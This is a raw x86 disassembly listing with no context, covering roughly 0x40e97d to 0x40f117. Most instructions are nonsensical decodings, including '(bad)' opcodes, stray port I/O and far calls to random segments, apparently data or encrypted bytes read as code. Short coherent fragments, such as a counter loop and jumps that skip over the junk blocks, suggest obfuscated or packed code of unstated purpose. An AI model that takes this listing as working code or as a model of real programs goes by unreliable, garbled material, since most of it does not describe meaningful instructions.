  40e97d:	xchg   ebp,eax
  40e97e:	rcr    DWORD PTR [edx-0x1b70750d],0xdd
  40e985:	lock ja 0x40e98d
  40e988:	pop    ecx
  40e989:	xor    esp,DWORD PTR [esi+0x10]
  40e98c:	push   ds
  40e98d:	mov    ds:0xc91f5884,al
  40e992:	push   0x5629367b
  40e997:	adc    eax,0x742cc0ed
  40e99c:	push   0xffffffe2
  40e99e:	ins    DWORD PTR es:[edi],dx
  40e99f:	jne    0x40e965
  40e9a1:	push   esi
  40e9a2:	mov    dh,0xd7
  40e9a4:	or     cl,BYTE PTR [esi+0x7]
  40e9a7:	(bad)  
  40e9a9:	dec    esi
  40e9aa:	inc    edx
  40e9ab:	call   0xaee8:0x36c4bdaa
  40e9b2:	inc    dl
  40e9b4:	sub    ebx,DWORD PTR [edx]
  40e9b6:	push   0x13064468
  40e9bb:	push   esi
  40e9bc:	push   edx
  40e9bd:	repz loop 0x40e953
  40e9c0:	rol    bh,0x4b
  40e9c3:	sub    BYTE PTR [eax+0x3ccd851b],ch
  40e9c9:	xor    BYTE PTR [edx-0x3f8912c],0x9b
  40e9d0:	cmp    eax,0x28134149
  40e9d5:	xchg   ecx,eax
  40e9d6:	pop    ds
  40e9d7:	mov    DWORD PTR [eax],esp
  40e9d9:	dec    edx
  40e9da:	pop    eax
  40e9db:	loopne 0x40ea29
  40e9dd:	dec    eax
  40e9de:	fwait
  40e9df:	jo     0x40ea14
  40e9e1:	xor    al,0xc4
  40e9e3:	(bad)  
  40e9e4:	jg     0x40e97c
  40e9e6:	add    BYTE PTR [eax],cl
  40e9e8:	(bad)  
  40e9e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9ea:	clc    
  40e9eb:	outs   dx,BYTE PTR ds:[esi]
  40e9ec:	into   
  40e9ed:	jle    0x40e98a
  40e9ef:	push   esp
  40e9f0:	loopne 0x40e998
  40e9f2:	popf   
  40e9f3:	pop    es
  40e9f4:	push   esp
  40e9f5:	or     bh,BYTE PTR [edx+edx*2]
  40e9f8:	jge    0x40e9a6
  40e9fa:	mov    ?,eax
  40e9fc:	fs inc ecx
  40e9fe:	push   cs
  40e9ff:	sub    ebp,ecx
  40ea01:	je     0x40e9a4
  40ea03:	xor    eax,0x7fadfcd
  40ea08:	or     cl,BYTE PTR [edi]
  40ea0a:	xor    al,0x9f
  40ea0c:	scas   al,BYTE PTR es:[edi]
  40ea0d:	jb     0x40ea10
  40ea0f:	lds    edi,FWORD PTR [ebx-0x679df22]
  40ea15:	mov    esi,0xa807fb0
  40ea1a:	arpl   WORD PTR ds:[ebp+edx*4-0x75],bp
  40ea1f:	sub    DWORD PTR [ecx+esi*2],eax
  40ea22:	rcl    ah,cl
  40ea24:	and    BYTE PTR [edi+0x2c],ah
  40ea27:	inc    esp
  40ea28:	and    ebp,ebx
  40ea2a:	cld    
  40ea2b:	and    al,0xb
  40ea2d:	test   eax,0xe4433822
  40ea32:	iret   
  40ea33:	fs test eax,0x64d61562
  40ea39:	xchg   edi,eax
  40ea3a:	xchg   edx,eax
  40ea3b:	xchg   ecx,eax
  40ea3c:	mov    eax,0x6e298709
  40ea41:	inc    ebx
  40ea42:	scas   eax,DWORD PTR es:[edi]
  40ea43:	adc    DWORD PTR [esp+eax*8-0x443bfab7],ecx
  40ea4a:	sahf   
  40ea4b:	fisttp DWORD PTR [ebx+0x167c5cf9]
  40ea51:	cs cld 
  40ea53:	adc    eax,0x6a2dc50
  40ea58:	daa    
  40ea59:	or     ecx,eax
  40ea5b:	shl    BYTE PTR [eax+edi*1+0x380a26f2],1
  40ea62:	repnz xor bl,BYTE PTR [edi]
  40ea65:	(bad)  
  40ea66:	or     eax,0xe4dab196
  40ea6b:	or     al,dh
  40ea6d:	iret   
  40ea6e:	inc    esi
  40ea6f:	jp     0x40ea30
  40ea71:	or     ebp,eax
  40ea73:	pop    ebp
  40ea74:	add    eax,0xebad6606
  40ea79:	sar    BYTE PTR [eax+eax*2],cl
  40ea7c:	push   ecx
  40ea7d:	mov    ebx,ebx
  40ea7f:	or     al,0x3b
  40ea81:	sbb    ecx,DWORD PTR ds:0xf67f309b
  40ea87:	test   al,0xac
  40ea89:	pop    ebp
  40ea8a:	xsha256 (bad)
  40ea8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea8c:	push   edi
  40ea8d:	mov    ds:0xf6ca905,eax
  40ea92:	or     al,0x8c
  40ea94:	jae    0x40eb10
  40ea96:	jl     0x40eafe
  40ea98:	in     eax,0xd1
  40ea9a:	jbe    0x40eb0d
  40ea9c:	ins    DWORD PTR es:[edi],dx
  40ea9d:	inc    esp
  40ea9e:	sub    al,0x36
  40eaa0:	xchg   edi,eax
  40eaa1:	sti    
  40eaa2:	jne    0x40eb4e
  40eaa8:	add    ecx,edx
  40eaaa:	mov    eax,DWORD PTR [ebp+0x8]
  40eaad:	sbb    ecx,0x443c
  40eab3:	mov    ecx,DWORD PTR [ebp-0x10]
  40eab6:	adc    edx,DWORD PTR ds:0x42fde5
  40eabc:	xor    eax,esi
  40eabe:	add    eax,edi
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e228,0x11
  40eade:	cmp    DWORD PTR ds:0x42e228,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e228,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e230
  40eafd:	push   0x42e26f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e40f
  40eb15:	cmp    DWORD PTR ds:0x42e228,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e228
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e228,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e228
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e228,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x41
  40eb8d:	(bad)  
  40eb8e:	mov    esi,0x70aff7b0
  40eb93:	jo     0x40eb58
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40ebf2
  40eb99:	fdiv   QWORD PTR [ebx+0x10]
  40eb9c:	(bad)  
  40eb9d:	fucom  st(6)
  40eb9f:	test   eax,0xe22d3d42
  40eba4:	jb     0x40eb73
  40eba6:	js     0x40eba4
  40eba8:	shl    BYTE PTR es:[ebp+0x70],cl
  40ebac:	lods   eax,DWORD PTR ds:[esi]
  40ebad:	cwde   
  40ebae:	xor    DWORD PTR [esi+0x33abe114],eax
  40ebb4:	adc    DWORD PTR [ebx+eiz*4-0x56],0xfffffff9
  40ebb9:	pop    esi
  40ebba:	(bad)  
  40ebbb:	jge    0x40ec29
  40ebbd:	test   eax,0x9816b95a
  40ebc2:	fsubr  DWORD PTR [esi-0x19cc9fa9]
  40ebc8:	push   cs
  40ebc9:	xchg   ebp,eax
  40ebca:	fsubr  st(3),st
  40ebcc:	and    edx,eax
  40ebce:	sbb    esp,DWORD PTR [ecx+eiz*4-0x49fa8168]
  40ebd5:	fwait
  40ebd6:	pop    esi
  40ebd7:	cmp    al,0x66
  40ebd9:	fnsave ds:0x5d6f705c
  40ebdf:	mov    eax,0xe6d287cf
  40ebe4:	stos   DWORD PTR es:[edi],eax
  40ebe5:	mov    dl,0xd7
  40ebe7:	scas   al,BYTE PTR es:[edi]
  40ebe8:	adc    ecx,esp
  40ebea:	pusha  
  40ebeb:	jle    0x40eb7b
  40ebed:	pop    esp
  40ebee:	adc    cl,dl
  40ebf0:	fadd   DWORD PTR [edx-0x213baa2c]
  40ebf6:	cmp    al,0xb4
  40ebf8:	fistp  DWORD PTR [ebx]
  40ebfa:	popf   
  40ebfb:	or     DWORD PTR [ecx-0x4b27af04],eax
  40ec01:	or     BYTE PTR [ebx-0x6c33ceda],dh
  40ec07:	xchg   ebp,eax
  40ec08:	pusha  
  40ec09:	test   DWORD PTR [edx-0x71d10c66],edi
  40ec0f:	mov    ds:0xacb81c81,eax
  40ec14:	mov    ds:0xbbab72b9,al
  40ec19:	mov    BYTE PTR [esi+ebp*4-0x2349a98c],ch
  40ec20:	inc    ebp
  40ec21:	mov    esp,0x16ccf75e
  40ec26:	jg     0x40eca6
  40ec28:	inc    esp
  40ec29:	daa    
  40ec2a:	loopne 0x40ebb1
  40ec2c:	mov    DWORD PTR [ecx-0x65],eax
  40ec2f:	into   
  40ec30:	push   es
  40ec31:	call   0xe2f6:0x6fcbede5
  40ec38:	out    dx,al
  40ec39:	out    0xf4,al
  40ec3b:	inc    esi
  40ec3c:	sahf   
  40ec3d:	out    dx,al
  40ec3e:	pop    ss
  40ec3f:	icebp  
  40ec40:	aas    
  40ec41:	jmp    0x40ec84
  40ec43:	cmc    
  40ec44:	(bad)  
  40ec46:	outs   dx,BYTE PTR ds:[esi]
  40ec47:	enter  0x8fa3,0x34
  40ec4b:	or     cl,BYTE PTR [ebp-0x59]
  40ec4e:	outs   dx,DWORD PTR ds:[esi]
  40ec4f:	adc    DWORD PTR [ebx-0x33],edi
  40ec52:	cmp    dh,BYTE PTR [eax+0x3a8b047f]
  40ec58:	add    al,0xa9
  40ec5a:	dec    eax
  40ec5b:	push   ebx
  40ec5c:	mov    dh,0xf0
  40ec5e:	and    dl,BYTE PTR cs:[edi-0x58]
  40ec62:	pop    ebp
  40ec63:	inc    edx
  40ec64:	inc    ebp
  40ec65:	shr    DWORD PTR [ecx+eiz*1],cl
  40ec68:	repnz dec esp
  40ec6a:	jecxz  0x40ece1
  40ec6c:	jmp    0xb6be:0x658ff846
  40ec73:	mov    edi,0x78a07c97
  40ec78:	cld    
  40ec79:	dec    edx
  40ec7a:	mov    edx,0x901d3adc
  40ec7f:	mov    ebp,0x1f5842dc
  40ec84:	and    edi,DWORD PTR [edi+0x73]
  40ec87:	add    eax,DWORD PTR [edx-0x3c]
  40ec8a:	out    dx,eax
  40ec8b:	fisttp QWORD PTR [edi+0x76]
  40ec8e:	inc    edi
  40ec8f:	iret   
  40ec90:	into   
  40ec91:	out    0xc1,al
  40ec93:	pop    ss
  40ec94:	sbb    bl,BYTE PTR [ecx+0xc]
  40ec97:	jle    0x40ec74
  40ec99:	xor    dl,BYTE PTR [eax+0x6d]
  40ec9c:	jo     0x40ec41
  40ec9e:	leave  
  40ec9f:	mov    ds:0x48957b07,eax
  40eca4:	or     DWORD PTR [eax+0x4f991778],eax
  40ecaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecab:	(bad)  
  40ecac:	dec    esp
  40ecad:	push   edx
  40ecae:	aas    
  40ecaf:	inc    ebx
  40ecb0:	push   esp
  40ecb1:	(bad)  
  40ecb2:	int    0xa1
  40ecb4:	call   edi
  40ecb6:	push   ss
  40ecb7:	fist   WORD PTR [ebp-0x34]
  40ecba:	push   0x6e6b76a6
  40ecbf:	and    BYTE PTR [ebx],ah
  40ecc1:	adc    cl,BYTE PTR [ebp+0x4775bb83]
  40ecc7:	jle    0x40ed24
  40ecc9:	scas   al,BYTE PTR es:[edi]
  40ecca:	mov    ch,BYTE PTR [ebx]
  40eccc:	in     eax,0x73
  40ecce:	enter  0x15fe,0x2
  40ecd2:	pop    ebx
  40ecd3:	out    dx,eax
  40ecd4:	ds dec ebx
  40ecd6:	std    
  40ecd7:	mov    eax,ds:0x2952cb25
  40ecdc:	mov    eax,ds:0x16b14c18
  40ece1:	aaa    
  40ece2:	dec    ebp
  40ece3:	xchg   ebx,eax
  40ece4:	xlat   BYTE PTR ds:[ebx]
  40ece5:	cmp    eax,ecx
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed5b
  40ed00:	cmp    dh,0x74
  40ed03:	mov    edx,0xc37070ae
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed2f
  40ed0c:	sar    DWORD PTR [ebx+0x6b],0x3
  40ed10:	pop    es
  40ed11:	cmp    DWORD PTR [edx],ebp
  40ed13:	add    BYTE PTR [ebx+eiz*8],bl
  40ed16:	daa    
  40ed17:	imul   BYTE PTR [eax]
  40ed19:	fmul   st,st(6)
  40ed1b:	pop    esi
  40ed1c:	sahf   
  40ed1d:	jns    0x40ecb0
  40ed1f:	(bad)  
  40ed20:	(bad)  
  40ed21:	and    eax,0x717c3e99
  40ed26:	inc    edi
  40ed27:	retf   0xb5f3
  40ed2a:	or     ecx,0x64
  40ed2d:	xor    ecx,ecx
  40ed2f:	xlat   BYTE PTR ds:[ebx]
  40ed30:	jge    0x40edab
  40ed32:	xchg   esi,eax
  40ed33:	add    dh,BYTE PTR [ebp+0x66080e6b]
  40ed39:	sbb    al,0x3c
  40ed3b:	inc    ebp
  40ed3c:	sub    bh,BYTE PTR [edi+0x4]
  40ed3f:	call   0x64a3:0xaf0f3c68
  40ed46:	push   0xffffff9e
  40ed48:	mov    ds:0x9bdb3c73,eax
  40ed4d:	mov    bh,ch
  40ed4f:	inc    ebx
  40ed50:	out    dx,al
  40ed51:	scas   eax,DWORD PTR es:[edi]
  40ed52:	in     eax,0x18
  40ed54:	rcr    BYTE PTR [ebx+0x63],1
  40ed57:	cmp    bl,BYTE PTR [eax-0x2e]
  40ed5a:	mov    edx,0x30a5ae39
  40ed5f:	fild   DWORD PTR [ebx]
  40ed61:	mov    eax,0xcdfb3e9e
  40ed66:	or     edx,0x6f15d0dc
  40ed6c:	dec    eax
  40ed6d:	leave  
  40ed6e:	dec    esp
  40ed6f:	sub    bh,BYTE PTR [edi-0x3cb40c83]
  40ed75:	loopne 0x40ed5e
  40ed77:	pop    edi
  40ed78:	dec    eax
  40ed79:	es pop edi
  40ed7b:	test   DWORD PTR [edi+0x42],0x8f0f894d
  40ed82:	mov    ah,0x7f
  40ed84:	push   esi
  40ed85:	mov    ecx,0xce76768b
  40ed8a:	cwde   
  40ed8b:	and    BYTE PTR [ebx],dl
  40ed8d:	mov    ebp,DWORD PTR [edx+0x78]
  40ed90:	sbb    dh,BYTE PTR ds:0xcf6732c1
  40ed96:	loop   0x40edea
  40ed98:	aam    0x4f
  40ed9a:	cmp    al,0x3a
  40ed9c:	sbb    DWORD PTR [ebx-0x1],0x40a75107
  40eda3:	in     al,0x4a
  40eda5:	mov    bh,0x25
  40eda7:	push   edx
  40eda8:	ja     0x40ee1c
  40edaa:	jmp    0xe815:0x426d6b6e
  40edb1:	fld    TBYTE PTR [ebx]
  40edb3:	jp     0x40eda2
  40edb5:	pop    ebx
  40edb6:	pop    esi
  40edb7:	mov    eax,0x4c8e4a83
  40edbc:	sub    ah,BYTE PTR [ecx]
  40edbe:	dec    DWORD PTR [esi]
  40edc0:	aad    0x6f
  40edc2:	xor    DWORD PTR [edi],esi
  40edc4:	and    ch,BYTE PTR [ecx+0x35]
  40edc7:	mov    ds:0x5516c4d5,eax
  40edcc:	ds ds push ds
  40edcf:	out    0x34,al
  40edd1:	hlt    
  40edd2:	int3   
  40edd3:	enter  0x15be,0x8e
  40edd7:	pop    es
  40edd8:	jne    0x40ed8d
  40edda:	fstp   st(6)
  40eddc:	arpl   ax,di
  40edde:	lods   al,BYTE PTR ds:[esi]
  40eddf:	repz test eax,0xec203117
  40ede5:	pop    esi
  40ede6:	repnz dec edi
  40ede8:	mov    ch,0x1c
  40edea:	mov    edi,esp
  40edec:	loope  0x40ee2d
  40edee:	dec    esp
  40edef:	sbb    edi,DWORD PTR [edi-0x36]
  40edf2:	call   0xc8ff16e3
  40edf7:	outs   dx,BYTE PTR ds:[esi]
  40edf8:	iret   
  40edf9:	mov    BYTE PTR [edi-0x1f],cl
  40edfc:	dec    ebx
  40edfd:	and    esp,DWORD PTR [edi-0x1e039916]
  40ee03:	pop    ds
  40ee04:	inc    esp
  40ee05:	xor    esi,DWORD PTR [ecx]
  40ee07:	lods   eax,DWORD PTR ds:[esi]
  40ee08:	add    eax,0x40cae98f
  40ee0d:	fist   DWORD PTR [ecx+0x4a230b5e]
  40ee13:	xor    BYTE PTR ds:0xc7bff918,0x3e
  40ee1a:	retf   0x3e5c
  40ee1d:	dec    ecx
  40ee1e:	mov    ebx,0x8920cb1b
  40ee23:	jae    0x40ee23
  40ee25:	les    ebp,FWORD PTR [ecx+ecx*1+0xb]
  40ee29:	dec    ebp
  40ee2a:	les    ecx,FWORD PTR [esi]
  40ee2c:	popa   
  40ee2d:	mov    bl,BYTE PTR [ebp+ecx*1-0x4e22fa6c]
  40ee34:	jp     0x40edd0
  40ee36:	fldenv [esi+0x7a8e373f]
  40ee3c:	loop   0x40ee26
  40ee3e:	and    ebp,esp
  40ee40:	leave  
  40ee41:	sahf   
  40ee42:	cmp    dl,bh
  40ee44:	imul   edi,DWORD PTR [ecx-0x1ac4a0d3],0xba6f9f29
  40ee4e:	inc    esp
  40ee4f:	nop
  40ee50:	sub    eax,DWORD PTR [ecx+0x52196ce9]
  40ee56:	lods   al,BYTE PTR ds:[esi]
  40ee57:	add    al,0xf
  40ee59:	(bad)  
  40ee5a:	jns    0x40ee5d
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0xb0
  40ee7f:	mov    cl,0x6b
  40ee81:	lods   al,BYTE PTR ds:[esi]
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee61
  40ee8b:	es cdq 
  40ee8d:	add    al,0xb
  40ee8f:	cdq    
  40ee90:	ja     0x40eea0
  40ee92:	icebp  
  40ee93:	jo     0x40eec8
  40ee95:	mov    bl,0xfb
  40ee97:	retf   
  40ee98:	push   eax
  40ee99:	fldcw  WORD PTR [ebx-0x6a]
  40ee9c:	out    0x8b,al
  40ee9e:	leave  
  40ee9f:	stc    
  40eea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eea1:	sub    al,0x55
  40eea3:	(bad)  
  40eea5:	in     eax,0xc5
  40eea7:	dec    esi
  40eea8:	lds    edx,FWORD PTR [ebx-0x1beb0410]
  40eeae:	add    bh,BYTE PTR [esi+0x373e9184]
  40eeb4:	popa   
  40eeb5:	arpl   cx,cx
  40eeb7:	jo     0x40ef0d
  40eeb9:	sbb    DWORD PTR ds:0xadd592c3,edi
  40eebf:	sub    eax,0xd1507ec4
  40eec4:	iret   
  40eec5:	fdiv   st,st(6)
  40eec7:	adc    al,0x17
  40eec9:	mov    edi,DWORD PTR [esi+0x77e635ac]
  40eecf:	jmp    0x40eeac
  40eed1:	xchg   esp,eax
  40eed2:	pop    es
  40eed3:	push   edi
  40eed4:	das    
  40eed5:	leave  
  40eed6:	divps  xmm4,XMMWORD PTR [eax+ebx*1]
  40eeda:	pop    edi
  40eedb:	adc    esi,DWORD PTR [ecx+0x74]
  40eede:	neg    ebx
  40eee0:	out    dx,eax
  40eee1:	setne  BYTE PTR [esi+eiz*2]
  40eee5:	lds    esi,FWORD PTR ds:0xb6670a6b
  40eeeb:	mov    ah,0x13
  40eeed:	lods   al,BYTE PTR ds:[esi]
  40eeee:	shr    BYTE PTR [ebp+0x4d],1
  40eef1:	lahf   
  40eef2:	inc    eax
  40eef3:	fs jnp 0x40eeb6
  40eef6:	jnp    0x40eeca
  40eef8:	jb     0x40ef07
  40eefa:	je     0x40eee6
  40eefc:	data16 daa 
  40eefe:	jle    0x40eebd
  40ef00:	jbe    0x40ef44
  40ef02:	retf   
  40ef03:	int    0x81
  40ef05:	sar    DWORD PTR [ecx],0x2d
  40ef08:	cmp    edi,ebp
  40ef0a:	shl    BYTE PTR [edi-0xee1307c],1
  40ef10:	test   BYTE PTR [ebx+edi*2+0x1ec96464],cl
  40ef17:	nop
  40ef18:	hlt    
  40ef19:	sub    al,0x7c
  40ef1b:	das    
  40ef1c:	inc    edx
  40ef1d:	pop    es
  40ef1e:	adc    ecx,DWORD PTR [edi]
  40ef20:	call   0x4a73:0x13acddb3
  40ef27:	xor    ah,BYTE PTR [edi-0x3a59d10a]
  40ef2d:	push   eax
  40ef2e:	or     esi,eax
  40ef30:	(bad)  [esi+0x7d]
  40ef33:	or     eax,0xd3ee1f22
  40ef38:	out    0x2a,al
  40ef3a:	hlt    
  40ef3b:	inc    ebp
  40ef3c:	sahf   
  40ef3d:	add    DWORD PTR [ebx+0x31],0xffffffff
  40ef41:	xchg   ebp,eax
  40ef42:	mov    BYTE PTR es:[edi],ah
  40ef45:	les    esi,FWORD PTR [eax+ecx*1]
  40ef48:	pop    es
  40ef49:	test   eax,0x6c155463
  40ef4e:	jg     0x40eee0
  40ef50:	out    0xaf,eax
  40ef52:	or     BYTE PTR [ebx-0x32409578],bh
  40ef58:	out    0x5a,al
  40ef5a:	fcomip st,st(7)
  40ef5c:	mov    bh,0xde
  40ef5e:	aad    0xfc
  40ef60:	sbb    BYTE PTR [ecx],dh
  40ef62:	sahf   
  40ef63:	inc    edx
  40ef64:	mov    edi,0x846d947
  40ef69:	loope  0x40ef62
  40ef6b:	clc    
  40ef6c:	or     eax,0xf884cc13
  40ef71:	fst    DWORD PTR [edx+0x7619ba97]
  40ef77:	mov    cl,0x27
  40ef79:	stos   BYTE PTR es:[edi],al
  40ef7a:	inc    eax
  40ef7b:	and    al,bl
  40ef7d:	imul   esi,esi,0xfffffffd
  40ef80:	xchg   BYTE PTR [edi],dh
  40ef82:	ror    DWORD PTR [ecx+esi*4+0x22111a38],0x62
  40ef8a:	je     0x40ef55
  40ef8c:	adc    DWORD PTR [edi-0x22c2d89e],0xffffff85
  40ef93:	mov    dl,0xcf
  40ef95:	hlt    
  40ef96:	dec    edi
  40ef97:	scas   al,BYTE PTR es:[edi]
  40ef98:	xchg   ebp,eax
  40ef99:	cdq    
  40ef9a:	push   cs
  40ef9b:	mov    bl,0xf0
  40ef9d:	mov    ebp,0xcdf6f69c
  40efa2:	mov    BYTE PTR [edx],dl
  40efa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efa5:	and    DWORD PTR [ebp-0x32660a39],esi
  40efab:	repnz xor DWORD PTR [ebp-0x73],esi
  40efaf:	fild   WORD PTR [esi]
  40efb1:	xor    ebx,eax
  40efb3:	lds    eax,FWORD PTR [ebp-0x8]
  40efb6:	mov    esp,0xf3bb4466
  40efbb:	adc    BYTE PTR [ebp+0x5d],ch
  40efbe:	lds    eax,FWORD PTR [eax+0x52b10723]
  40efc4:	pop    eax
  40efc5:	mov    al,0x84
  40efc7:	sub    eax,0xe4120eed
  40efcc:	fstp   QWORD PTR [ecx]
  40efce:	push   edi
  40efcf:	gs push cs
  40efd1:	(bad)  
  40efd3:	and    DWORD PTR [ecx-0x39cc4a7f],esi
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	stos   BYTE PTR es:[edi],al
  40effb:	and    DWORD PTR [ebx+0x70abd07c],0x707fc370
  40f005:	jo     0x40efd4
  40f007:	adc    BYTE PTR [edi],al
  40f009:	outs   dx,DWORD PTR ds:[esi]
  40f00a:	mov    dh,0xed
  40f00c:	ins    BYTE PTR es:[edi],dx
  40f00d:	xchg   edx,eax
  40f00e:	pop    eax
  40f00f:	push   ebp
  40f010:	pop    es
  40f011:	jae    0x40ef95
  40f013:	cli    
  40f014:	imul   ebx,DWORD PTR [ecx-0x2f01fffd],0x50
  40f01b:	push   es
  40f01c:	mov    ebx,0xb8c7f9cb
  40f021:	out    0xbf,eax
  40f023:	js     0x40f021
  40f025:	in     al,dx
  40f026:	inc    edi
  40f027:	dec    ecx
  40f028:	cmp    esi,esp
  40f02a:	xchg   esp,eax
  40f02b:	inc    edx
  40f02c:	sahf   
  40f02d:	out    dx,al
  40f02e:	jo     0x40f097
  40f030:	pop    es
  40f031:	cmc    
  40f032:	stc    
  40f033:	mov    al,0x79
  40f035:	sbb    al,0x1f
  40f037:	fisubr WORD PTR [esi+0x35f928a4]
  40f03d:	pushf  
  40f03e:	xchg   ebp,eax
  40f03f:	inc    esp
  40f040:	shr    edx,cl
  40f042:	daa    
  40f043:	popa   
  40f044:	rcl    al,0x23
  40f047:	xchg   ah,bl
  40f049:	sti    
  40f04a:	dec    BYTE PTR [edi-0x20]
  40f04d:	mov    esp,0x4869c08f
  40f052:	and    eax,0x3b21ef14
  40f057:	xor    al,BYTE PTR [ebx-0x2ba5c7e0]
  40f05d:	sub    ebx,DWORD PTR [ebx+ebx*2]
  40f060:	inc    edi
  40f061:	imul   BYTE PTR [ecx]
  40f063:	inc    edi
  40f064:	addr16 (bad) 
  40f066:	jns    0x40f02e
  40f068:	add    esp,ebx
  40f06a:	and    dh,ah
  40f06c:	cli    
  40f06d:	nop
  40f06e:	pop    ebp
  40f06f:	(bad)  
  40f070:	cmp    BYTE PTR [ebp-0x67],dl
  40f073:	mov    DWORD PTR [ecx-0x74],ebx
  40f076:	clc    
  40f077:	(bad)  
  40f078:	loopne 0x40f0c2
  40f07a:	in     al,0x3c
  40f07c:	ret    0x8b3
  40f07f:	int    0x2f
  40f081:	ds cmp esi,0xffffffaf
  40f085:	xor    BYTE PTR [esi-0x80],al
  40f088:	fsubr  st(5),st
  40f08a:	xor    al,0xbe
  40f08c:	mov    eax,0x4987aae9
  40f091:	xchg   BYTE PTR [esi-0x3e2ab168],al
  40f097:	call   0xf34578fd
  40f09c:	scas   eax,DWORD PTR es:[edi]
  40f09d:	xchg   edx,eax
  40f09e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f09f:	mov    ebp,eax
  40f0a1:	call   0x289f:0x3dabbf3e
  40f0a8:	inc    ebp
  40f0a9:	iret   
  40f0aa:	cmp    bh,cl
  40f0ac:	add    al,0xb5
  40f0ae:	mov    ecx,0x4773b8f
  40f0b3:	xor    bl,BYTE PTR [esi-0x40981147]
  40f0b9:	or     ebx,ebp
  40f0bb:	loop   0x40f128
  40f0bd:	ret    
  40f0be:	sbb    eax,0x4ad6a2dc
  40f0c3:	cmp    eax,DWORD PTR [edi+esi*8-0x34fac69d]
  40f0ca:	push   ds
  40f0cb:	out    0x3d,al
  40f0cd:	loop   0x40f11d
  40f0cf:	mov    ebx,0xa0bb5360
  40f0d4:	daa    
  40f0d5:	xor    BYTE PTR [ebx],dh
  40f0d7:	sbb    BYTE PTR [edi],0xa3
  40f0da:	xor    ch,BYTE PTR [edx]
  40f0dc:	xchg   ebx,eax
  40f0dd:	or     DWORD PTR [edi+0x747df2fd],0xb09d5646
  40f0e7:	ins    DWORD PTR es:[edi],dx
  40f0e8:	mov    ch,0xff
  40f0ea:	bound  ecx,QWORD PTR [esi+ebx*8+0x70]
  40f0ee:	je     0x40f12d
  40f0f0:	and    BYTE PTR [ecx+ebp*8+0x2423ac42],bl
  40f0f7:	xlat   BYTE PTR ds:[ebx]
  40f0f8:	(bad)  
  40f0f9:	cmp    DWORD PTR ds:[eax],ebp
  40f0fc:	ret    
  40f0fd:	call   0xfd3b:0x9f76a6c7
  40f104:	pop    ss
  40f105:	out    dx,al
  40f106:	push   esp
  40f107:	mov    DWORD PTR [eax-0x28],edi
  40f10a:	cdq    
  40f10b:	sub    ch,BYTE PTR [edi-0x178aa946]
  40f111:	push   ds
  40f112:	in     al,0x4f
  40f114:	js     0x40f136
  40f116:	(bad)  
  40f117:	adc    DWORD PTR [ecx-0x348d9b8b],eax
